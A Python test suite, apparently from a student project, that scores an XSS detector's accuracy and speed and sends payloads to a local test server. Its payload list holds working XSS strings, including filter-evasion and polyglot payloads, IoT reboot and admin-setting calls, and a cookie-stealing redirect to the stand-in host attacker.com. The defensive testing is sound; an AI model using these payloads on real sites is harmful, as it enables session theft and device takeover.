#!/usr/bin/env python3
"""
XSS Attack Test Scripts
Generate various XSS attack scenarios for testing detection system
Bachelor's Final Year Project
"""

import requests
import urllib.parse
import time
import json
import random
from xss_detector import XSSDetector

class XSSTestSuite:
    """Test suite for XSS attack detection"""
    
    def __init__(self, target_host="http://127.0.0.1:8080"):
        self.target_host = target_host
        self.detector = XSSDetector()
        self.test_results = []
        
        # Extended XSS attack payloads for testing
        self.xss_payloads = [
            # Basic Script Injection
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            
            # JavaScript URL schemes
            "javascript:alert('XSS')",
            "javascript:alert(1)",
            "javascript:document.location='http://attacker.com/steal?cookie='+document.cookie",
            
            # Event Handler Injection
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "<input onfocus=alert('XSS') autofocus>",
            
            # HTML Injection
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>",
            
            # Advanced Techniques
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",  # Base64 encoded
            "<script>setTimeout('alert(1)',1000)</script>",
            "<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>",
            
            # Filter Evasion
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert('XSS');//</script>",
            "<script>/**/alert('XSS')/**/</script>",
            
            # URL Encoded
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "%3Cimg%20src=x%20onerror=alert('XSS')%3E",
            
            # Double Encoded
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            
            # DOM-based XSS
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "'-alert('XSS')-'",
            
            # CSS Injection
            "<style>@import'javascript:alert(1)';</style>",
            "<style>body{background:url('javascript:alert(1)')}</style>",
            
            # Data URI
            "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
            
            # Polyglot Payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            
            # IoT Specific Attacks
            "<script>fetch('/api/control?action=reboot')</script>",
            "<img src=x onerror=fetch('/api/settings',{method:'POST',body:'admin=true'})>",
            "<script>navigator.sendBeacon('/api/data','stolen='+document.cookie)</script>"
        ]
        
        # Safe payloads (should not trigger detection)
        self.safe_payloads = [
            "normal search query",
            "temperature sensor data",
            "device status update",
            "user preferences",
            "configuration settings",
            "Hello World",
            "123456",
            "<b>Bold text</b>",  # Safe HTML
            "email@example.com",
            "http://example.com"
        ]
    
    def test_detection_accuracy(self):
        """Test detection accuracy with known payloads"""
        print("Testing XSS Detection Accuracy...")
        print("=" * 50)
        
        true_positives = 0
        false_positives = 0
        true_negatives = 0
        false_negatives = 0
        
        # Test malicious payloads (should be detected)
        print("\\nTesting malicious payloads:")
        for i, payload in enumerate(self.xss_payloads):
            result = self.detector.detect_xss(payload, "127.0.0.1", f"/test/{i}")
            
            if result["detected"]:
                true_positives += 1
                status = "✅ DETECTED"
            else:
                false_negatives += 1
                status = "❌ MISSED"
            
            print(f"{i+1:2d}. {status} - {payload[:50]}")
        
        # Test safe payloads (should NOT be detected)
        print("\\nTesting safe payloads:")
        for i, payload in enumerate(self.safe_payloads):
            result = self.detector.detect_xss(payload, "127.0.0.1", f"/safe/{i}")
            
            if not result["detected"]:
                true_negatives += 1
                status = "✅ SAFE"
            else:
                false_positives += 1
                status = "❌ FALSE ALARM"
            
            print(f"{i+1:2d}. {status} - {payload}")
        
        # Calculate metrics
        total_malicious = len(self.xss_payloads)
        total_safe = len(self.safe_payloads)
        
        precision = true_positives / (true_positives + false_positives) if (true_positives + false_positives) > 0 else 0
        recall = true_positives / (true_positives + false_negatives) if (true_positives + false_negatives) > 0 else 0
        accuracy = (true_positives + true_negatives) / (total_malicious + total_safe)
        f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
        
        print("\\n" + "=" * 50)
        print("DETECTION ACCURACY RESULTS")
        print("=" * 50)
        print(f"True Positives:  {true_positives:2d} / {total_malicious} ({true_positives/total_malicious*100:.1f}%)")
        print(f"False Negatives: {false_negatives:2d} / {total_malicious} ({false_negatives/total_malicious*100:.1f}%)")
        print(f"True Negatives:  {true_negatives:2d} / {total_safe} ({true_negatives/total_safe*100:.1f}%)")
        print(f"False Positives: {false_positives:2d} / {total_safe} ({false_positives/total_safe*100:.1f}%)")
        print("-" * 50)
        print(f"Accuracy:  {accuracy:.3f} ({accuracy*100:.1f}%)")
        print(f"Precision: {precision:.3f} ({precision*100:.1f}%)")
        print(f"Recall:    {recall:.3f} ({recall*100:.1f}%)")
        print(f"F1-Score:  {f1_score:.3f} ({f1_score*100:.1f}%)")
        print("=" * 50)
        
        return {
            "accuracy": accuracy,
            "precision": precision,
            "recall": recall,
            "f1_score": f1_score,
            "true_positives": true_positives,
            "false_positives": false_positives,
            "true_negatives": true_negatives,
            "false_negatives": false_negatives
        }
    
    def test_web_server_attacks(self):
        """Test attacks against actual web server"""
        print("\\nTesting Web Server XSS Attacks...")
        print("=" * 50)
        
        successful_attacks = 0
        failed_requests = 0
        
        for i, payload in enumerate(self.xss_payloads[:15]):  # Test first 15 payloads
            try:
                # Test GET request with payload
                encoded_payload = urllib.parse.quote_plus(payload)
                url = f"{self.target_host}/search?q={encoded_payload}"
                
                print(f"Attack {i+1:2d}: {payload[:40]}...")
                
                response = requests.get(url, timeout=5)
                
                if response.status_code == 200:
                    # Check if payload is reflected in response
                    if payload in response.text or encoded_payload in response.text:
                        successful_attacks += 1
                        print(f"         ✅ Payload reflected in response")
                    else:
                        print(f"         ⚠️  Request successful but payload filtered")
                else:
                    print(f"         ❌ Server error: {response.status_code}")
                    failed_requests += 1
                
                time.sleep(0.5)  # Avoid overwhelming server
                
            except requests.RequestException as e:
                print(f"         ❌ Request failed: {e}")
                failed_requests += 1
        
        print("\\n" + "=" * 50)
        print("WEB SERVER TEST RESULTS")
        print("=" * 50)
        print(f"Successful Attacks: {successful_attacks}")
        print(f"Failed Requests: {failed_requests}")
        print(f"Success Rate: {successful_attacks/(len(self.xss_payloads[:15])-failed_requests)*100:.1f}%")
        print("=" * 50)
    
    def generate_traffic_patterns(self, duration=60):
        """Generate realistic traffic patterns with embedded attacks"""
        print(f"\\nGenerating traffic patterns for {duration} seconds...")
        
        start_time = time.time()
        request_count = 0
        attack_count = 0
        
        while time.time() - start_time < duration:
            try:
                # 80% normal traffic, 20% attack traffic
                if random.random() < 0.8:
                    # Normal traffic
                    safe_payload = random.choice(self.safe_payloads)
                    url = f"{self.target_host}/search?q={urllib.parse.quote_plus(safe_payload)}"
                else:
                    # Attack traffic
                    attack_payload = random.choice(self.xss_payloads)
                    url = f"{self.target_host}/search?q={urllib.parse.quote_plus(attack_payload)}"
                    attack_count += 1
                
                response = requests.get(url, timeout=2)
                request_count += 1
                
                if request_count % 10 == 0:
                    print(f"Requests: {request_count}, Attacks: {attack_count}")
                
                # Random delay between requests
                time.sleep(random.uniform(0.1, 2.0))
                
            except requests.RequestException:
                continue
        
        print(f"\\nTraffic generation completed!")
        print(f"Total requests: {request_count}")
        print(f"Attack requests: {attack_count}")
    
    def performance_test(self, num_requests=1000):
        """Test detection performance"""
        print(f"\\nRunning performance test with {num_requests} requests...")
        
        start_time = time.time()
        
        for i in range(num_requests):
            payload = random.choice(self.xss_payloads + self.safe_payloads)
            self.detector.detect_xss(payload, "127.0.0.1", f"/perf/{i}")
            
            if (i + 1) % 100 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed
                print(f"Processed: {i+1}, Rate: {rate:.1f} req/sec")
        
        end_time = time.time()
        total_time = end_time - start_time
        avg_rate = num_requests / total_time
        
        print("\\n" + "=" * 50)
        print("PERFORMANCE TEST RESULTS")
        print("=" * 50)
        print(f"Total Requests: {num_requests}")
        print(f"Total Time: {total_time:.2f} seconds")
        print(f"Average Rate: {avg_rate:.1f} requests/second")
        print(f"Average Time per Request: {(total_time/num_requests)*1000:.2f} ms")
        print("=" * 50)
    
    def run_all_tests(self):
        """Run complete test suite"""
        print("XSS ATTACK DETECTION TEST SUITE")
        print("=" * 60)
        
        # Test detection accuracy
        accuracy_results = self.test_detection_accuracy()
        
        # Test performance
        self.performance_test(500)
        
        # Test web server (if available)
        try:
            response = requests.get(f"{self.target_host}/", timeout=5)
            if response.status_code == 200:
                self.test_web_server_attacks()
        except requests.RequestException:
            print("\\nWeb server not available, skipping web tests")
        
        return accuracy_results

def main():
    """Main test function"""
    print("XSS Attack Detection Test System")
    print("=" * 40)
    
    # Create test suite
    test_suite = XSSTestSuite()
    
    import sys
    if len(sys.argv) > 1:
        command = sys.argv[1]
        
        if command == "accuracy":
            test_suite.test_detection_accuracy()
        elif command == "performance":
            test_suite.performance_test()
        elif command == "web":
            test_suite.test_web_server_attacks()
        elif command == "traffic":
            duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
            test_suite.generate_traffic_patterns(duration)
        elif command == "all":
            test_suite.run_all_tests()
        else:
            print(f"Unknown command: {command}")
    else:
        # Run all tests by default
        test_suite.run_all_tests()

if __name__ == "__main__":
    main()